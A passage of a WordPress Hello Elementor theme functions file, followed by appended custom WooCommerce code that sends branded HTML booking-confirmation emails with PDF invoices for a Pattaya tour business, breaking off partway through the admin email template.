<?php
/**
 * Theme functions and definitions
 *
 * @package HelloElementor
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define( 'HELLO_ELEMENTOR_VERSION', '3.4.4' );
define( 'EHP_THEME_SLUG', 'hello-elementor' );

define( 'HELLO_THEME_PATH', get_template_directory() );
define( 'HELLO_THEME_URL', get_template_directory_uri() );
define( 'HELLO_THEME_ASSETS_PATH', HELLO_THEME_PATH . '/assets/' );
define( 'HELLO_THEME_ASSETS_URL', HELLO_THEME_URL . '/assets/' );
define( 'HELLO_THEME_SCRIPTS_PATH', HELLO_THEME_ASSETS_PATH . 'js/' );
define( 'HELLO_THEME_SCRIPTS_URL', HELLO_THEME_ASSETS_URL . 'js/' );
define( 'HELLO_THEME_STYLE_PATH', HELLO_THEME_ASSETS_PATH . 'css/' );
define( 'HELLO_THEME_STYLE_URL', HELLO_THEME_ASSETS_URL . 'css/' );
define( 'HELLO_THEME_IMAGES_PATH', HELLO_THEME_ASSETS_PATH . 'images/' );
define( 'HELLO_THEME_IMAGES_URL', HELLO_THEME_ASSETS_URL . 'images/' );

if ( ! isset( $content_width ) ) {
	$content_width = 800; // Pixels.
}

if ( ! function_exists( 'hello_elementor_setup' ) ) {
	/**
	 * Set up theme support.
	 *
	 * @return void
	 */
	function hello_elementor_setup() {
		if ( is_admin() ) {
			hello_maybe_update_theme_version_in_db();
		}

		if ( apply_filters( 'hello_elementor_register_menus', true ) ) {
			register_nav_menus( [ 'menu-1' => esc_html__( 'Header', 'hello-elementor' ) ] );
			register_nav_menus( [ 'menu-2' => esc_html__( 'Footer', 'hello-elementor' ) ] );
		}

		if ( apply_filters( 'hello_elementor_post_type_support', true ) ) {
			add_post_type_support( 'page', 'excerpt' );
		}

		if ( apply_filters( 'hello_elementor_add_theme_support', true ) ) {
			add_theme_support( 'post-thumbnails' );
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'title-tag' );
			add_theme_support(
				'html5',
				[
					'search-form',
					'comment-form',
					'comment-list',
					'gallery',
					'caption',
					'script',
					'style',
					'navigation-widgets',
				]
			);
			add_theme_support(
				'custom-logo',
				[
					'height'      => 100,
					'width'       => 350,
					'flex-height' => true,
					'flex-width'  => true,
				]
			);
			add_theme_support( 'align-wide' );
			add_theme_support( 'responsive-embeds' );

			/*
			 * Editor Styles
			 */
			add_theme_support( 'editor-styles' );
			add_editor_style( 'editor-styles.css' );

			/*
			 * WooCommerce.
			 */
			if ( apply_filters( 'hello_elementor_add_woocommerce_support', true ) ) {
				// WooCommerce in general.
				add_theme_support( 'woocommerce' );
				// Enabling WooCommerce product gallery features (are off by default since WC 3.0.0).
				// zoom.
				add_theme_support( 'wc-product-gallery-zoom' );
				// lightbox.
				add_theme_support( 'wc-product-gallery-lightbox' );
				// swipe.
				add_theme_support( 'wc-product-gallery-slider' );
			}
		}
	}
}
add_action( 'after_setup_theme', 'hello_elementor_setup' );

function hello_maybe_update_theme_version_in_db() {
	$theme_version_option_name = 'hello_theme_version';
	// The theme version saved in the database.
	$hello_theme_db_version = get_option( $theme_version_option_name );

	// If the 'hello_theme_version' option does not exist in the DB, or the version needs to be updated, do the update.
	if ( ! $hello_theme_db_version || version_compare( $hello_theme_db_version, HELLO_ELEMENTOR_VERSION, '<' ) ) {
		update_option( $theme_version_option_name, HELLO_ELEMENTOR_VERSION );
	}
}

if ( ! function_exists( 'hello_elementor_display_header_footer' ) ) {
	/**
	 * Check whether to display header footer.
	 *
	 * @return bool
	 */
	function hello_elementor_display_header_footer() {
		$hello_elementor_header_footer = true;

		return apply_filters( 'hello_elementor_header_footer', $hello_elementor_header_footer );
	}
}

if ( ! function_exists( 'hello_elementor_scripts_styles' ) ) {
	/**
	 * Theme Scripts & Styles.
	 *
	 * @return void
	 */
	function hello_elementor_scripts_styles() {
		if ( apply_filters( 'hello_elementor_enqueue_style', true ) ) {
			wp_enqueue_style(
				'hello-elementor',
				HELLO_THEME_STYLE_URL . 'reset.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}

		if ( apply_filters( 'hello_elementor_enqueue_theme_style', true ) ) {
			wp_enqueue_style(
				'hello-elementor-theme-style',
				HELLO_THEME_STYLE_URL . 'theme.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}

		if ( hello_elementor_display_header_footer() ) {
			wp_enqueue_style(
				'hello-elementor-header-footer',
				HELLO_THEME_STYLE_URL . 'header-footer.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}
	}
}
add_action( 'wp_enqueue_scripts', 'hello_elementor_scripts_styles' );

if ( ! function_exists( 'hello_elementor_register_elementor_locations' ) ) {
	/**
	 * Register Elementor Locations.
	 *
	 * @param ElementorPro\Modules\ThemeBuilder\Classes\Locations_Manager $elementor_theme_manager theme manager.
	 *
	 * @return void
	 */
	function hello_elementor_register_elementor_locations( $elementor_theme_manager ) {
		if ( apply_filters( 'hello_elementor_register_elementor_locations', true ) ) {
			$elementor_theme_manager->register_all_core_location();
		}
	}
}
add_action( 'elementor/theme/register_locations', 'hello_elementor_register_elementor_locations' );

if ( ! function_exists( 'hello_elementor_content_width' ) ) {
	/**
	 * Set default content width.
	 *
	 * @return void
	 */
	function hello_elementor_content_width() {
		$GLOBALS['content_width'] = apply_filters( 'hello_elementor_content_width', 800 );
	}
}
add_action( 'after_setup_theme', 'hello_elementor_content_width', 0 );

if ( ! function_exists( 'hello_elementor_add_description_meta_tag' ) ) {
	/**
	 * Add description meta tag with excerpt text.
	 *
	 * @return void
	 */
	function hello_elementor_add_description_meta_tag() {
		if ( ! apply_filters( 'hello_elementor_description_meta_tag', true ) ) {
			return;
		}

		if ( ! is_singular() ) {
			return;
		}

		$post = get_queried_object();
		if ( empty( $post->post_excerpt ) ) {
			return;
		}

		echo '<meta name="description" content="' . esc_attr( wp_strip_all_tags( $post->post_excerpt ) ) . '">' . "\n";
	}
}
add_action( 'wp_head', 'hello_elementor_add_description_meta_tag' );

// Settings page
require get_template_directory() . '/includes/settings-functions.php';

// Header & footer styling option, inside Elementor
require get_template_directory() . '/includes/elementor-functions.php';

if ( ! function_exists( 'hello_elementor_customizer' ) ) {
	// Customizer controls
	function hello_elementor_customizer() {
		if ( ! is_customize_preview() ) {
			return;
		}

		if ( ! hello_elementor_display_header_footer() ) {
			return;
		}

		require get_template_directory() . '/includes/customizer-functions.php';
	}
}
add_action( 'init', 'hello_elementor_customizer' );

if ( ! function_exists( 'hello_elementor_check_hide_title' ) ) {
	/**
	 * Check whether to display the page title.
	 *
	 * @param bool $val default value.
	 *
	 * @return bool
	 */
	function hello_elementor_check_hide_title( $val ) {
		if ( defined( 'ELEMENTOR_VERSION' ) ) {
			$current_doc = Elementor\Plugin::instance()->documents->get( get_the_ID() );
			if ( $current_doc && 'yes' === $current_doc->get_settings( 'hide_title' ) ) {
				$val = false;
			}
		}
		return $val;
	}
}
add_filter( 'hello_elementor_page_title', 'hello_elementor_check_hide_title' );

/**
 * BC:
 * In v2.7.0 the theme removed the `hello_elementor_body_open()` from `header.php` replacing it with `wp_body_open()`.
 * The following code prevents fatal errors in child themes that still use this function.
 */
if ( ! function_exists( 'hello_elementor_body_open' ) ) {
	function hello_elementor_body_open() {
		wp_body_open();
	}
}

require HELLO_THEME_PATH . '/theme.php';

HelloTheme\Theme::instance();














// ================================
// Family Park Pattaya — MAIL TEMPLATES
// ================================


// ================= USER EMAIL =================
/* ===========================================================
 * Family Park Pattaya — Responsive Customer Email (brand #3E4F22) + PDF Invoice
 * - Sends on processing & completed
 * - Booking details WITH prices
 * - Traveler details (billing + room_no + special_request)* - Static Addresses & Google Maps links (Tiger Park, Family Park, Great & Grand)
 * - Attaches PDF from "PDF Invoices & Packing Slips for WooCommerce" (WP Overnight)
 * - Disables Woo default customer Processing/Completed emails
 * =========================================================== */

add_filter('woocommerce_email_enabled_customer_processing_order', '__return_false', 10, 2);
add_filter('woocommerce_email_enabled_customer_completed_order',  '__return_false', 10, 2);

add_action('woocommerce_order_status_processing', 'tripdust_send_customer_email_with_pdf', 10);
add_action('woocommerce_order_status_completed',  'tripdust_send_customer_email_with_pdf', 10);

function tripdust_send_customer_email_with_pdf( $order_id ){
    if ( empty($order_id) || ! function_exists('wc_get_order') ) return;

    $order = wc_get_order($order_id);
    if ( ! $order ) return;

    $sent_key = '_familypark_customer_email_with_pdf_sent';
    if ( $order->get_meta($sent_key) ) return;

    /* ---- Brand / assets ---- */
    $brand       = 'Family Park Pattaya';
    $brand_color = '#3E4F22';
    $logo_src    = 'https://familyparkpattaya.com/wp-content/uploads/2025/08/cropped-New-Project-6.png';
    $support_mail= 'info@familyparkpattaya.com';

    /* ---- Build ITEMS table with booking details (keep PRICES) ---- */
    $items_rows_html = '';
    foreach ( $order->get_items( 'line_item' ) as $item ) {
        if ( ! is_a( $item, 'WC_Order_Item_Product' ) ) continue;

        $pkg_name = esc_html( $item->get_name() );
        $lines    = td_build_booking_lines_with_prices__td( $item );
        if ( empty( $lines ) ) {
            $qty   = (int) $item->get_quantity();
            $total = $item->get_total();
            $lines = [
                sprintf( '%02d × %s', $qty, wc_price( $qty ? $total / $qty : $total, ['currency' => $order->get_currency()] ) ),
                'Item total: ' . wc_price( $total, ['currency' => $order->get_currency()] ),
            ];
        }
        $detail_html = implode( '<br>', array_map( 'esc_html', $lines ) );

        $items_rows_html .=
            '<tr>' .
                '<td style="vertical-align:top;padding:12px;font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#222;border-top:1px solid #e8ecf2;">' . $pkg_name . '</td>' .
                '<td style="vertical-align:top;padding:12px;font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#222;border-top:1px solid #e8ecf2;">' . $detail_html . '</td>' .
            '</tr>';
    }

    /* ---- Totals card ---- */
    $totals_html = '';
    $totals_rows = $order->get_order_item_totals();
    if ( ! empty( $totals_rows ) ) {
        $totals_html .= '<tr><td style="padding:0 20px 14px 20px;">';
        $totals_html .= '<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">';
        $totals_html .= '<tbody>';
        foreach ( $totals_rows as $row ) {
            $totals_html .= '<tr>
                <td style="padding:12px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#334155;border-top:1px solid #eef3f8;background:#f9fbfd;">' . wp_kses_post( $row['label'] ) . '</td>
                <td align="right" style="padding:12px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #eef3f8;background:#f9fbfd;">' . wp_kses_post( $row['value'] ) . '</td>
            </tr>';
        }
        $totals_html .= '</tbody></table></td></tr>';
    }

    /* ---- Traveler details (billing fields + room_no + special_request) ---- */
    $traveler_rows_html = td_build_traveler_details_rows_html__td( $order );
    $traveler_html = '';
    if ( $traveler_rows_html ) {
        $traveler_html =
        '<tr>
            <td style="padding:0 20px 14px 20px;">
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">
                    <thead>
                        <tr>
                            <th colspan="2" style="padding:12px 14px;font:700 15px Arial,Helvetica,sans-serif;color:#0f172a;background:#f1f5fb;border-bottom:1px solid #e8ecf2;text-align:left;">Traveler details</th>
                        </tr>
                    </thead>
                    <tbody>' . $traveler_rows_html . '</tbody>
                </table>
            </td>
        </tr>';
    }

    /* ---- Static Addresses & Locations (requested) ---- */
    $locations_html =
        '<tr>
            <td style="padding:0 20px 14px 20px;">
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">
                    <thead>
                        <tr>
                            <th colspan="2" style="padding:12px 14px;font:700 15px Arial,Helvetica,sans-serif;color:#0f172a;background:#f1f5fb;border-bottom:1px solid #e8ecf2;text-align:left;">Addresses & Locations</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td style="width:42%;padding:10px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#475569;border-top:1px solid #e8ecf2;">Tiger Park</td>
                            <td style="padding:10px 14px;font:400 14px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #e8ecf2;">
                                <a href="https://maps.app.goo.gl/2TXUuMSzLJf8LTcQA" target="_blank" style="color:'.$brand_color.';text-decoration:underline;">Open in Google Maps</a>
                            </td>
                        </tr>
                        <tr>
                            <td style="width:42%;padding:10px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#475569;border-top:1px solid #e8ecf2;">Family Park</td>
                            <td style="padding:10px 14px;font:400 14px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #e8ecf2;">
                                <a href="https://maps.app.goo.gl/z2Q5Es4Hp4EhfpraA" target="_blank" style="color:'.$brand_color.';text-decoration:underline;">Open in Google Maps</a>
                            </td>
                        </tr>
                        <tr>
                            <td style="width:42%;padding:10px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#475569;border-top:1px solid #e8ecf2;">Great &amp; Grand</td>
                            <td style="padding:10px 14px;font:400 14px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #e8ecf2;">
                                <a href="https://maps.app.goo.gl/Tp6FBXCumk2PqqeB6" target="_blank" style="color:'.$brand_color.';text-decoration:underline;">Open in Google Maps</a>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>';

    /* ---- COD notice if applicable ---- */
    $cod_tip = '';
    $pm_title = strtolower( (string) $order->get_payment_method_title() );
    if ( strpos($pm_title,'cash') !== false || strpos($pm_title,'cod') !== false || strpos($pm_title,'taxi') !== false ) {
        $cod_tip = '<p style="margin:0;font:400 14px/1.6 Arial,Helvetica,sans-serif;color:#334155;">Please keep cash ready. Our driver will collect payment at pickup before your trip begins.</p>';
    }

    /* ---- HTML (responsive) ---- */
    $preheader   = esc_html('Thanks — your Family Park Pattaya order is confirmed.');
    $order_no_h  = esc_html( $order->get_order_number() );
    $brand_h     = esc_html( $brand );
    $cust_name_h = esc_html( method_exists($order,'get_formatted_billing_full_name') ? $order->get_formatted_billing_full_name() : trim($order->get_billing_first_name().' '.$order->get_billing_last_name()) );
    $order_url   = esc_url( method_exists($order,'get_view_order_url') ? $order->get_view_order_url() : $order->get_checkout_order_received_url() );
    $logo_attr   = esc_attr( $logo_src );

    ob_start(); ?>
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width">
  <meta http-equiv="x-ua-compatible" content="IE=edge">
  <style>
    @media only screen and (max-width:600px){
      .container{ width:100% !important; border-radius:0 !important; }
      .px{ padding-left:16px !important; padding-right:16px !important; }
      .py{ padding-top:14px !important; padding-bottom:14px !important; }
      h1{ font-size:20px !important; line-height:1.3 !important; }
      .btn{ display:block !important; width:100% !important; text-align:center !important; }
      .hero-pad{ padding:18px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background:#eef2f7;">
<span style="display:none!important;font-size:1px;color:#eef2f7;line-height:1;max-height:0;max-width:0;opacity:0;overflow:hidden;"><?php echo $preheader; ?></span>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:<?php echo $brand_color; ?>;">
  <tr>
    <td align="center">
      <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;width:680px;">
        <tr>
          <td class="hero-pad" align="center" style="padding:22px;">
            <img src="<?php echo $logo_attr; ?>" alt="Family Park Pattaya" style="height:54px;display:block;">
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="padding:0 0 24px 0;background:#eef2f7;">
  <tr><td align="center">
    <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;background:#ffffff;border-radius:14px;overflow:hidden;box-shadow:0 8px 24px rgba(16,24,40,.06);">
      <tr>
        <td class="px" style="padding:22px 24px 10px 24px;">
          <div style="text-align:center;font:700 16px Arial,Helvetica,sans-serif;color:#0f172a;"><?php echo $brand_h; ?></div>
        </td>
      </tr>
      <tr>
        <td class="px" style="padding:0 24px 8px 24px;">
          <h1 style="margin:0;text-align:center;font:700 22px Arial,Helvetica,sans-serif;color:#0f172a;">Thank you for your order</h1>
        </td>
      </tr>
      <tr>
        <td class="px" style="padding:0 24px 16px 24px;">
          <p style="margin:0 0 8px 0;font:400 14px/1.6 Arial,Helvetica,sans-serif;color:#334155;">Hi <?php echo $cust_name_h; ?>,</p>
          <p style="margin:0 0 8px 0;font:400 14px/1.6 Arial,Helvetica,sans-serif;color:#334155;">We’ve received your order <strong>#<?php echo $order_no_h; ?></strong> and it’s now being processed.</p>
          <?php echo $cod_tip; ?>
        </td>
      </tr>

      <!-- Items -->
      <tr>
        <td class="px" style="padding:0 20px 14px 20px;">
          <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">
            <thead>
              <tr>
                <th align="left" style="padding:12px 14px;font:700 13px Arial,Helvetica,sans-serif;color:#0f172a;border-bottom:1px solid #e8ecf2;background:#f1f5fb;">Package</th>
                <th align="left" style="padding:12px 14px;font:700 13px Arial,Helvetica,sans-serif;color:#0f172a;border-bottom:1px solid #e8ecf2;background:#f1f5fb;">Booking details</th>
              </tr>
            </thead>
            <tbody>
              <?php echo $items_rows_html; ?>
            </tbody>
          </table>
        </td>
      </tr>

      <?php echo $traveler_html; ?>
      <?php echo $locations_html; ?>
      <?php echo $totals_html; ?>

      <!-- Optional CTA
      <tr>
        <td class="px" align="center" style="padding:8px 24px 22px 24px;">
          <a class="btn" href="<?php echo $order_url; ?>" style="display:inline-block;background:<?php echo $brand_color; ?>;color:#ffffff;text-decoration:none;font:600 14px Arial,Helvetica,sans-serif;padding:12px 22px;border-radius:8px;">View booking</a>
        </td>
      </tr> -->
    </table>
  </td></tr>
</table>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:<?php echo $brand_color; ?>;">
  <tr>
    <td align="center">
      <table role="presentation" width="680" class="container" cellpadding="0" cellspacing="0" style="max-width:680px;width:680px;">
        <tr>
          <td class="hero-pad" align="center" style="padding:18px 22px;">
            <p style="margin:0;font:400 12px Arial,Helvetica,sans-serif;color:#e6f0db;">© <?php echo esc_html( date_i18n('Y') ); ?> Family Park Pattaya · Need help? <a href="mailto:<?php echo esc_attr($support_mail); ?>" style="color:#ffffff;text-decoration:underline;"><?php echo esc_html($support_mail); ?></a></p>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

</body>
</html>
<?php
    $html = ob_get_clean();

    /* ---- Generate + attach PDF invoice (WP Overnight) ---- */
    $attachments = [];
    try {
        if ( class_exists('WPO_WCPDF') && ( function_exists('wcpdf_get_document') || function_exists('wpo_wcpdf_get_document') ) ) {
            $invoice = function_exists('wcpdf_get_document')
                ? wcpdf_get_document( 'invoice', $order, true )
                : wpo_wcpdf_get_document( 'invoice', $order, true );

            if ( $invoice ) {
                $tmp_path = trailingslashit( WPO_WCPDF()->main->get_tmp_path('attachments') );
                if ( ! file_exists( $tmp_path ) ) { wp_mkdir_p( $tmp_path ); }

                $filename = $invoice->get_filename();
                $pdf_path = $tmp_path . $filename;

                $pdf_data = $invoice->get_pdf();
                if ( ! empty( $pdf_data ) ) {
                    file_put_contents( $pdf_path, $pdf_data );
                    if ( file_exists( $pdf_path ) ) $attachments[] = $pdf_path;
                }
            }
        }
    } catch ( \Throwable $e ) {
        if ( function_exists('wc_get_logger') ) {
            wc_get_logger()->warning( 'FamilyPark: PDF not attached — '.$e->getMessage(), ['source'=>'familypark-email'] );
        }
    }

    /* ---- Send ---- */
    $to       = $order->get_billing_email();
    if ( ! is_email( $to ) ) return;

    $subject  = sprintf( 'Your %s booking — Order #%s', $brand, $order->get_order_number() );
    $headers  = [ 'Content-Type: text/html; charset=UTF-8' ];
    WC()->mailer()->send( $to, $subject, $html, $headers, $attachments );

    $order->update_meta_data( $sent_key, current_time('mysql') );
    $order->save();
}


/* ===================== Helpers (unchanged) ===================== */
function td_build_booking_lines_with_prices__td( $item ){
    if ( ! is_a($item,'WC_Order_Item_Product') ) return [];
    $meta = td_item_meta_map__td( $item );
    $lines = [];

    $blob = td_meta_get_any__td( $meta, ['booking_details','bookingdetails'] );
    if ( $blob ) {
        $parts = array_filter(array_map('trim', preg_split('/\r?\n+/', (string)$blob) ));
        if (empty($parts) || stripos($parts[0], 'Booking Details') !== 0) {
            $lines[] = 'Booking Details:';
        }
        foreach ($parts as $p){ $lines[] = $p; }
        return td_unique_clean__td( $lines );
    }

    $date = td_meta_get_any__td( $meta, ['date_of_booking','booking_date','date'] );
    if ( $date ) $lines[] = 'Booking Date: ' . $date;

    $option = td_meta_get_any__td( $meta, [
        'package','activity','package_variant','variant','plan','option',
        'tour_variant','package_name','package_type','program','service','tour'
    ] );
    if ( $option ) $lines[] = $option;

    $ad = td_meta_get_any__td( $meta, ['adults','adult'] );                 if ( $ad ) $lines[] = $ad;
    $ch = td_meta_get_any__td( $meta, ['children','child','kids','kid'] );  if ( $ch ) $lines[] = $ch;
    $inf= td_meta_get_any__td( $meta, ['infants','infant','baby','babies'] ); if ( $inf ) $lines[] = $inf;

    $it_total = td_meta_get_any__td( $meta, ['total','booking_total','grand_total'] );
    if ( $it_total ) $lines[] = $it_total;

    return td_unique_clean__td( $lines );
}
function td_build_traveler_details_rows_html__td( $order ){
    if ( ! $order instanceof WC_Order ) return '';
    $country_code = $order->get_billing_country();
    $country_name = $country_code;
    if ( function_exists('WC') && isset( WC()->countries->countries[ $country_code ] ) ) {
        $country_name = WC()->countries->countries[ $country_code ];
    }
    $state_code = $order->get_billing_state();
    $state_name = $state_code;
    if ( $country_code && $state_code && function_exists('WC') ) {
        $states = WC()->countries->get_states( $country_code );
        if ( is_array($states) && isset($states[$state_code]) ) $state_name = $states[$state_code];
    }

    $fields = [
        'First name'       => $order->get_billing_first_name(),
        'Last name'        => $order->get_billing_last_name(),
        'Country / Region' => $country_name,
        'Hotel / Address'  => $order->get_billing_address_1(),
        'Address 2'        => $order->get_billing_address_2(),
        'Town / City'      => $order->get_billing_city(),
        'State / County'   => $state_name,
        'Postcode / ZIP'   => $order->get_billing_postcode(),
        'Phone'            => $order->get_billing_phone(),
        'Email address'    => $order->get_billing_email(),
        'Room no.'         => $order->get_meta('room_no') ?: $order->get_meta('billing_room_no'),
        'Special Request'  => $order->get_meta('special_request') ?: $order->get_meta('billing_special_request'),
    ];

    $rows = '';
    foreach ( $fields as $label => $value ) {
        $value = is_string($value) ? trim($value) : $value;
        if ( $value === '' || $value === null ) continue;
        $val_html = nl2br( esc_html( (string) $value ) );
        $rows .= '<tr>
            <td style="width:42%;padding:10px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#475569;border-top:1px solid #e8ecf2;">'.esc_html($label).'</td>
            <td style="padding:10px 14px;font:400 14px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #e8ecf2;">'.$val_html.'</td>
        </tr>';
    }
    return $rows;
}
function td_item_meta_map__td( $item ){
    $out = [];
    foreach ( $item->get_meta_data() as $m ) {
        $key = td_normalize_key__td( $m->key );
        if ( ! $key ) continue;
        $val = $m->value;
        if ( is_array($val) ) $val = implode(', ', array_map('wp_strip_all_tags', $val) );
        $val = (string) $val;
        $val = preg_replace('/<\s*br\s*\/?\s*>/i', "\n", $val);
        $val = preg_replace('/<\/(p|div|li|tr)\s*>/i', "\n", $val);
        $val = wp_strip_all_tags( $val );
        $val = str_replace(["\r"], '', $val);
        $val = preg_replace('/[\t ]+/', ' ', $val);
        $val = preg_replace('/\n{2,}/', "\n", $val);
        $out[ $key ] = trim( $val );
    }
    return $out;
}
function td_normalize_key__td( $k ){
    $k = strtolower( (string) $k );
    $k = str_replace( [' ', '-', '__'], ['_', '_', '_'], $k );
    return preg_replace( '/[^a-z0-9_]/', '', $k );
}
function td_meta_get_any__td( $meta_map, $candidates ){
    foreach ( (array) $candidates as $k ) {
        $nk = td_normalize_key__td( $k );
        if ( isset( $meta_map[ $nk ] ) ) return $meta_map[ $nk ];
    }
    return '';
}
function td_unique_clean__td( $arr ){
    return array_values( array_unique( array_filter( array_map( 'trim', (array) $arr ) ) ) );
}



// ================= ADMIN EMAIL =================
/* ===========================================================
 * Family Park Pattaya — ADMIN email (responsive, green header)
 * - Triggers on on-hold / processing / completed
 * - NO vendor details (removed as requested)
 * - Booking details + traveler details
 * - Optional PDF invoice attachment (WP Overnight)
 * - Optional: disables Woo default "New order" admin email
 * =========================================================== */

add_action('init', function () {
    $disable_default_admin_new_order = true;
    if ( $disable_default_admin_new_order ) {
        add_filter('woocommerce_email_enabled_new_order', '__return_false', 10, 2);
    }
});

add_action('woocommerce_order_status_on-hold',   'td_send_admin_email_with_vendors__td', 10);
add_action('woocommerce_order_status_processing','td_send_admin_email_with_vendors__td', 10);
add_action('woocommerce_order_status_completed', 'td_send_admin_email_with_vendors__td', 10);

function td_send_admin_email_with_vendors__td( $order_id ){
    if ( empty($order_id) || ! function_exists('wc_get_order') ) return;
    $order = wc_get_order($order_id);
    if ( ! $order ) return;

    $sent_key = '_familypark_admin_email_sent';
    if ( $order->get_meta($sent_key) ) return;

    /* ---- Brand / assets ---- */
    $brand_name  = 'Family Park Pattaya';
    $brand_color = '#3E4F22';
    $logo_src    = 'https://familyparkpattaya.com/wp-content/uploads/2025/08/cropped-New-Project-6.png';

    /* ---- Build ITEMS table (booking details WITH prices) ---- */
    $items_rows_html = '';
    foreach ( $order->get_items('line_item') as $item ) {
        if ( ! $item instanceof WC_Order_Item_Product ) continue;

        $pkg_name = esc_html( $item->get_name() );
        $lines = function_exists('td_build_booking_lines_with_prices__td')
            ? td_build_booking_lines_with_prices__td($item)
            : [];

        if ( empty($lines) ) {
            $qty   = (int) $item->get_quantity();
            $total = $item->get_total();
            $lines = [
                'Booking Details:',
                sprintf('%02d × %s', $qty, wc_price($qty ? $total/$qty : $total, ['currency'=>$order->get_currency()])),
                'Item total: ' . wc_price($total, ['currency'=>$order->get_currency()] ),
            ];
        }

        $detail_html = implode('<br>', array_map('esc_html', $lines));

        $items_rows_html .=
            '<tr>' .
                '<td style="vertical-align:top;padding:12px;font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#222;border-top:1px solid #e8ecf2;">'.$pkg_name.'</td>' .
                '<td style="vertical-align:top;padding:12px;font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#222;border-top:1px solid #e8ecf2;">'.$detail_html.'</td>' .
            '</tr>';
    }

    /* ---- Traveler details (billing + custom) ---- */
    $traveler_rows_html = '';
    $trav = [
        'First name'      => $order->get_billing_first_name(),
        'Last name'       => $order->get_billing_last_name(),
        'Country / Region'=> $order->get_billing_country(),
        'Hotel / Address' => $order->get_billing_address_1(),
        'Town / City'     => $order->get_billing_city(),
        'Postcode / ZIP'  => $order->get_billing_postcode(),
        'Phone'           => $order->get_billing_phone(),
        'Email address'   => $order->get_billing_email(),
        'Room no.'        => get_post_meta( $order->get_id(), '_room_no', true ) ?: ( $order->get_meta('room_no') ),
        'Special Request' => get_post_meta( $order->get_id(), '_special_request', true ) ?: ( $order->get_meta('special_request') ),
    ];
    foreach ($trav as $label => $val){
        if ( $val === '' || $val === null ) continue;
        $traveler_rows_html .= '<tr>
            <td style="width:42%;padding:10px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#475569;border-top:1px solid #e8ecf2;">'.esc_html($label).'</td>
            <td style="padding:10px 14px;font:400 14px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #e8ecf2;">'.esc_html($val).'</td>
        </tr>';
    }
    $traveler_html = $traveler_rows_html ? (
        '<tr><td style="padding:0 20px 14px 20px;">
            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">
                <thead><tr>
                    <th colspan="2" style="padding:12px 14px;font:700 15px Arial,Helvetica,sans-serif;color:#0f172a;background:#f1f5fb;border-bottom:1px solid #e8ecf2;text-align:left;">Traveler details</th>
                </tr></thead>
                <tbody>'.$traveler_rows_html.'</tbody>
            </table>
        </td></tr>'
    ) : '';

    /* ---- Totals ---- */
    $totals_html = '';
    $totals_rows = $order->get_order_item_totals();
    if ( ! empty( $totals_rows ) ) {
        $totals_html .= '<tr><td style="padding:0 20px 14px 20px;">';
        $totals_html .= '<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8ecf2;border-radius:10px;overflow:hidden;">';
        $totals_html .= '<tbody>';
        foreach ( $totals_rows as $row ) {
            $totals_html .= '<tr>
                <td style="padding:12px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#334155;border-top:1px solid #eef3f8;background:#f9fbfd;">' . wp_kses_post( $row['label'] ) . '</td>
                <td align="right" style="padding:12px 14px;font:600 13px Arial,Helvetica,sans-serif;color:#0f172a;border-top:1px solid #eef3f8;background:#f9fbfd;">' . wp_kses_post( $row['value'] ) . '</td>
            </tr>';
        }
        $totals_html .= '</tbody></table></td></tr>';
    }

    /* ---- Build email HTML (no vendor section) ---- */
    $preheader   = esc_html('New order received.');
    $order_no_h  = esc_html( $order->get_order_number() );
    $order_url   = esc_url( admin_url('post.php?post='.$order->get_id().'&action=edit') );
    $logo_attr   = esc_attr( $logo_src );

    ob_start(); ?>
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width">
  <style>
    @media only screen and (max-width:600px){
      .container{ width:100%!important; border-radius:0!important; }
      .px{ padding-left:16px!important; padding-right:16px!important; }
      .hero-pad{ padding:18px!important; }
      h1{ font-size:20px!important; line-height:1.3!important; }
      .btn{ display:block!important; width:100%!important; text-align:center!important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background:#eef2f7;">
<span style="display:none!important;font-size:1px;color:#eef2f7;line-height:1;max-height:0;max-width:0;opacity:0;overflow:hidden;"><?php echo $preheader; ?></span>

